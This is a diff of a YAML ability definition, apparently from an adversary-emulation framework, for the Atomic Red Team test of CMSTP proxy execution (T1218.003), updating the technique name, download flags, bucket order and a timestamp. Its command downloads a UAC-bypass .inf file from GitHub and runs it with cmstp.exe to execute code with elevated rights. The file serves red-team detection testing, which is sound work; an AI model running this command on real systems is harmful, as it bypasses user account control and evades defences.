@@ -5,7 +5,7 @@
   tactic: stealth
   technique:
     attack_id: T1218.003
-    name: 'Signed Binary Proxy Execution: CMSTP'
+    name: 'System Binary Proxy Execution: CMSTP'
   platforms:
     windows:
       sh:
@@ -13,8 +13,8 @@
           {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
           "PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf") -ErrorAction
           ignore | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf"
-          -OutFile "PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf"; fi;
-          cmstp.exe /s "PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf"
+          -OutFile "PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf" -UseBasicParsing;
+          fi; cmstp.exe /s "PathToAtomicsFolder\T1218.003\src\T1218.003_uacbypass.inf"
           /au'
   plugin: atomic
   singleton: false
@@ -22,9 +22,9 @@
   delete_payload: false
   privilege: ''
   buckets:
-  - atomic-red-team
-  - t1218.003
   - stealth
+  - t1218.003
+  - atomic-red-team
   author: Atomic Red Team
   additional_info:
     input_arguments:
@@ -43,9 +43,9 @@
         -ErrorAction ignore | Out-Null
 
         Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1218.003/src/T1218.003_uacbypass.inf"
-        -OutFile "#{inf_file_uac}"
+        -OutFile "#{inf_file_uac}" -UseBasicParsing
 
         '
     technique_created: '2020-01-23T18:27:30.656Z'
     atomic_guid: 748cb4f6-2fb3-4e97-b7ad-b22635a09ab0
-    import_timestamp: '2026-10-20T07:08:26.626199Z'
+    import_timestamp: '2026-10-21T07:01:49.388244Z'
